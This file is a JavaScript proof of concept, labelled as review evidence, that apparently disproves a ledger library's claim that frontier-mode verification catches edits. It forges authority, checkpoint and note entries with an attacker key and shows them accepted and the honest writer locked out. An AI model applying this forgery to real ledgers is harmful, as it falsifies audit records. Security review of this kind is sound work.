// Reviewer proof of concept (review evidence, not product code). Claim under test, from docs/ledger-provenance-evaluation.md (K1):
//   "verify({mode: 'frontier'}) re-hashes the whole prefix, so an edit anywhere is caught"
//   "An append onto a ledger that no longer verifies is refused."
// The attacker below holds NO legitimate private key. It has write access to the ledger directory only.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {sign, createPrivateKey} from 'node:crypto';

const repo = process.argv[2];
const {createLedger, openLedger, defineKinds, generateSigner, LEDGER_SCHEMA} = await import(path.join(repo, 'ophanim/ledger/chain.mjs'));
const {canonical, digest} = await import(path.join(repo, 'ophanim/board.mjs'));

const H = v => 'sha256:' + digest(v);
const bodyOf = e => ({schema: e.schema, kind: e.kind, author: e.author, derived_from: e.derived_from, payload_ref: e.payload_ref});
const orderOf = e => ({seq: e.seq, parent: e.parent, body: H(bodyOf(e))});
const sig = (v, pem) => sign(null, Buffer.from(canonical(v)), createPrivateKey(pem)).toString('base64');

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ledger-poc-'));
const kinds = defineKinds({note: {authors: a => a.key_id === 'seat', validate: () => null, rederive: () => null}});

// --- Honest setup: three keys the attacker never sees.
const operator = generateSigner('operator'), orderer = generateSigner('orderer'), seat = generateSigner('seat');
const anchor = createLedger({dir, operator, order: orderer,
  authority: {keyring: {operator: operator.publicJwk, orderer: orderer.publicJwk, seat: seat.publicJwk}, orderer: 'orderer', operators: ['operator']}});
const honest = openLedger({dir, kinds, anchor});
honest.append({kind: 'note', payload: {text: 'honest entry'}, author: {key_id: 'seat'}, signer: seat, order: orderer});
console.log('honest ledger, full verify      :', JSON.stringify({ok: honest.verify().ok, entries: honest.verify().entries}));

// --- Attacker: reads the public genesis line, discards everything after it, writes its own tail.
const mallory = generateSigner('mallory');
const file = path.join(dir, 'chain.jsonl');
const genesis = JSON.parse(fs.readFileSync(file, 'utf8').split('\n')[0]);
const put = value => { const ref = H(value); fs.writeFileSync(path.join(dir, 'objects', ref.slice(7) + '.json'), canonical(value)); return ref; };
const forge = (prev, seq, kind, authorId, payload) => {
  const e = {schema: LEDGER_SCHEMA, seq, parent: H(prev), kind, author: {key_id: authorId}, derived_from: [], payload_ref: put(payload)};
  e.author_sig = sig(bodyOf(e), mallory.privatePem);   // never a legitimate key
  e.order_sig = sig(orderOf(e), mallory.privatePem);
  return e;
};
// 1. An "authority" entry that re-points every key id at the attacker's public key. It claims the operator wrote it.
const authority = forge(genesis, 2, 'authority', 'operator', {add: {operator: mallory.publicJwk, orderer: mallory.publicJwk, seat: mallory.publicJwk}});
// 2. A checkpoint "by the orderer" (now the attacker) committing to the forged prefix.
const checkpoint = forge(authority, 3, 'checkpoint', 'orderer', {through: 2, root: H({hashes: [H(genesis), H(authority)]})});
// 3. Any entry the attacker likes, "authored" by the seat.
const forged = forge(checkpoint, 4, 'note', 'seat', {text: 'FORGED: written without any legitimate key'});
fs.writeFileSync(file, [genesis, authority, checkpoint, forged].map(e => JSON.stringify(e) + '\n').join(''));

// --- A reader who pins the ORIGINAL genesis anchor.
const reader = openLedger({dir, kinds, anchor});
const frontier = reader.verify({mode: 'frontier'});
const full = reader.verify({mode: 'full'});
console.log('forged ledger, frontier verify  :', JSON.stringify({ok: frontier.ok, entries: frontier.entries, why: frontier.why}));
console.log('forged ledger, full verify      :', JSON.stringify({ok: full.ok, why: full.why}));

// --- The library's own append (verify-before-append uses frontier mode) extends the forged ledger.
let appended;
try {
  const r = reader.append({kind: 'note', payload: {text: 'second forged entry via the public API'}, author: {key_id: 'seat'},
    signer: {...mallory, key_id: 'seat'}, order: {...mallory, key_id: 'orderer'}});
  appended = {accepted: true, seq: r.seq};
} catch (error) { appended = {accepted: false, why: error.message}; }
console.log('append onto the forged ledger   :', JSON.stringify(appended));

// --- An honest writer on the same ledger is now locked out.
let honestAppend;
try { honest.append({kind: 'note', payload: {text: 'honest'}, author: {key_id: 'seat'}, signer: seat, order: orderer}); honestAppend = {accepted: true}; }
catch (error) { honestAppend = {accepted: false, why: error.message}; }
console.log('honest append after the forgery :', JSON.stringify(honestAppend));

const expected = frontier.ok === true && full.ok === false && appended.accepted === true;
console.log(expected ? 'RESULT: frontier-mode forgery REPRODUCED' : 'RESULT: not reproduced');
fs.rmSync(dir, {recursive: true, force: true});
process.exitCode = expected ? 0 : 1;
